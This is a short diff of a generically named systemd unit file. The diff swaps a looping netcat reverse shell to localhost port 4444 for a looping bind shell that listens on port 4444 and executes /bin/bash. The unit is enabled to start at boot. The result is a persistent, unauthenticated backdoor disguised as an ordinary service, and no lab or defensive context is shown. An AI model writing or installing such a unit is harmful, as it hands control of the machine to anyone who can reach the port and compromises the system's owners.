@@ -20,7 +20,7 @@ Description=Systemd service.
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'while [ 1 ]; do nc 127.0.0.1 4444 --e /bin/bash; sleep 10; done'
+ExecStart=/bin/bash -c 'while [ 1 ]; do nc -l 4444 --e /bin/bash; sleep 10; done'
 
 [Install]
 WantedBy=multi-user.target
